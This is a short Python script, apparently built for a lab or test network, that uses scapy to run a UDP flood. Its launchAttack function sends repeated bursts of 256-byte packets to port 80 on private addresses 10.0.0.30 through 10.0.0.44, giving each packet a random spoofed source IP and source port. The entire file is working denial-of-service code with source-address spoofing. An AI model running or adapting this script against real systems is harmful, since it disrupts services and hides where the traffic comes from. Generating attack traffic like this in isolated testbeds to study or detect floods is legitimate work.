import sys
import time
from os import popen
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from random import randrange
from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP, Ether


def generateSourceIP():
    not_valid = {10, 127, 254, 255, 1, 2, 169, 172, 192}
    first = randrange(1, 256)

    while first in not_valid:
        first = randrange(1, 256)

    ip = ".".join([str(first), str(randrange(1, 256)), str(randrange(1, 256)), str(randrange(1, 256))])
    return ip


def generateDestinationIP(start, end):
    first = 10
    second = 0;
    third = 0;

    # eg, ip = "10.0.0.64"
    ip = ".".join([str(first), str(second), str(third), str(randrange(start, end))])

    return ip


def generateRandomSrcPort():
    sport = random.randint(1024, 65535)
    return sport


def main():
    for i in range(1, 100):
        launchAttack(300)
        time.sleep(2)


def launchAttack(n):
    # eg, python attack.py 10.0.0.64, where destinationIP = 10.0.0.64
    # destinationIP = sys.argv[1:]
    # destinationIP = ["10.0.0.50","10.0.0.51","10.0.0.52","10.0.0.53","10.0.0.54","10.0.0.55","10.0.0.56","10.0.0.57","10.0.0.58","10.0.0.59"]
    # destinationIP[random.randint(0, len(destinationIP) - 1)]
    # print destinationIP

    interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()

    for i in range(0, n):
        data = Raw(b"X" * 256)
        packets = Ether() / IP(dst=generateDestinationIP(30, 45), src=generateSourceIP()) / UDP(dport=80,
                                                                                                sport=generateRandomSrcPort()) / data
        print(repr(packets))
        interval = random.random()
        interval = float("0.0" + str(interval)[2:5])
        # send packets with interval = 0.025 s
        sendp(packets, iface=interface.rstrip(), inter=interval)


if __name__ == "__main__":
    main()
